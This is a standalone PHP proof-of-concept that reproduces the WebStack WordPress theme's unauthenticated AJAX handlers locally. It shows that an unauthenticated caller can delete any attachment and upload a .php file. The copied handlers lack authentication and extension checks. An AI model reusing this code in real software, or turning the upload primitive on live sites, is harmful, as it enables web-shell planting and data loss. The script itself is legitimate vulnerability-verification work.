<?php
/*
 * Standalone local PoC for WebStack inc/ajax.php unauthenticated AJAX media actions.
 * It stubs the minimum WordPress functions and dispatches the vulnerable nopriv
 * handlers exactly as admin-ajax.php would for unauthenticated requests.
 *
 * Modes:
 *   php PoC.php delete   -> unauthenticated attachment deletion primitive
 *   php PoC.php upload   -> unauthenticated arbitrary-extension upload primitive
 */

$mode = $argv[1] ?? 'delete';
$registered_actions = [];
$deleted_ids = [];
$uploaded_path = null;
$last_attachment = [];

$fakeWp = __DIR__ . '/fakewp/';
@mkdir($fakeWp . 'wp-admin/includes', 0777, true);
@file_put_contents($fakeWp . 'wp-admin/includes/image.php', "<?php // fake image helpers for PoC\n");
define('ABSPATH', $fakeWp);

function add_action($hook, $callback) {
    global $registered_actions;
    $registered_actions[$hook] = $callback;
}

function __($text, $domain = null) { return $text; }

function wp_delete_attachment($id) {
    global $deleted_ids;
    $deleted_ids[] = $id;
    echo "[side-effect] wp_delete_attachment called with id={$id}\n";
    return true;
}

function wp_upload_dir() {
    $path = __DIR__ . '/uploads';
    @mkdir($path, 0777, true);
    return [
        'path' => $path,
        'url' => 'http://example.test/wp-content/uploads',
    ];
}

function wp_insert_attachment($attachment, $filename) {
    global $uploaded_path, $last_attachment;
    $uploaded_path = $filename;
    $last_attachment = $attachment + ['filename' => $filename];
    echo "[side-effect] wp_insert_attachment called for {$filename}\n";
    return 7331;
}

function wp_generate_attachment_metadata($attach_id, $filename) {
    return ['id' => $attach_id, 'file' => $filename];
}

function wp_update_attachment_metadata($attach_id, $data) {
    return true;
}

function wp_get_attachment_url($attach_id) {
    global $last_attachment;
    return $last_attachment['guid'] ?? 'http://example.test/wp-content/uploads/unknown';
}

function error($msg) { echo $msg; exit; }

// Vulnerable extract from captured inc/ajax.php.
add_action('wp_ajax_nopriv_img_upload', 'io_img_upload');
add_action('wp_ajax_img_upload', 'io_img_upload');
function io_img_upload(){
    $extArr = array("jpg", "png", "jpeg");
    $file = $_FILES['files'];
    if ( !empty( $file ) ) {
        $wp_upload_dir = wp_upload_dir();
        $basename = $file['name'];
        $baseext = pathinfo($basename, PATHINFO_EXTENSION);
        $dataname = date("YmdHis_").substr(md5(time()), 0, 8) . '.' . $baseext;
        $filename = $wp_upload_dir['path'] . '/' . $dataname;
        rename( $file['tmp_name'], $filename );
        $attachment = array(
            'guid'           => $wp_upload_dir['url'] . '/' . $dataname,
            'post_mime_type' => $file['type'],
            'post_title'     => preg_replace( '/\.[^.]+$/', '', $basename ),
            'post_content'   => '',
            'post_status'    => 'inherit'
        );
        $attach_id = wp_insert_attachment( $attachment, $filename );
        if($attach_id != 0){
            require_once( ABSPATH . 'wp-admin/includes/image.php' );
            $attach_data = wp_generate_attachment_metadata( $attach_id, $filename );
            wp_update_attachment_metadata( $attach_id, $attach_data );
            print_r(json_encode(array('status'=>1,'msg'=>__('图片添加成功','i_theme'),'data'=>array('id'=>$attach_id,'src'=>wp_get_attachment_url( $attach_id ),'title'=>$basename))));
            exit();
        }else{
            echo '{"status":4,"msg":"'.__('图片上传失败！','i_theme').'"}';
            exit();
        }
    }
}

add_action('wp_ajax_nopriv_img_remove', 'io_img_remove');
add_action('wp_ajax_img_remove', 'io_img_remove');
function io_img_remove(){
    $attach_id = $_POST["id"];
    if( empty($attach_id) ){
        echo '{"status":3,"msg":"'.__('没有上传图像！','i_theme').'"}';
        exit;
    }
    if ( false === wp_delete_attachment( $attach_id ) )
        echo '{"status":4,"msg":"'.sprintf(__('图片 %s 删除失败！','i_theme'), $attach_id).'"}';
    else
        echo '{"status":1,"msg":"'.__('删除成功！','i_theme').'"}';
    exit;
}

register_shutdown_function(function () use ($mode) {
    global $deleted_ids, $uploaded_path, $registered_actions;
    if ($mode === 'delete') {
        if (isset($registered_actions['wp_ajax_nopriv_img_remove']) && in_array('4242', $deleted_ids, true)) {
            echo "\n[VULNERABLE] Unauthenticated nopriv img_remove deleted attacker-selected attachment id 4242 without nonce/auth check.\n";
        } else {
            echo "\n[NOT VULNERABLE] Delete primitive was not reached.\n";
        }
    } elseif ($mode === 'upload') {
        if (isset($registered_actions['wp_ajax_nopriv_img_upload']) && $uploaded_path && is_file($uploaded_path) && str_ends_with($uploaded_path, '.php')) {
            echo "\n[VULNERABLE] Unauthenticated nopriv img_upload accepted and stored a .php payload path: {$uploaded_path}\n";
        } else {
            echo "\n[NOT VULNERABLE] Upload primitive was not reached.\n";
        }
    }
});

if ($mode === 'delete') {
    $_POST['id'] = '4242';
    $registered_actions['wp_ajax_nopriv_img_remove']();
} elseif ($mode === 'upload') {
    $tmp = tempnam(sys_get_temp_dir(), 'webstack_upload_');
    file_put_contents($tmp, "<?php echo 'local poc'; ?>\n");
    $_FILES['files'] = [
        'name' => 'poc.php',
        'type' => 'application/x-php',
        'tmp_name' => $tmp,
        'error' => 0,
        'size' => filesize($tmp),
    ];
    $registered_actions['wp_ajax_nopriv_img_upload']();
} else {
    fwrite(STDERR, "Usage: php PoC.php [delete|upload]\n");
    exit(2);
}
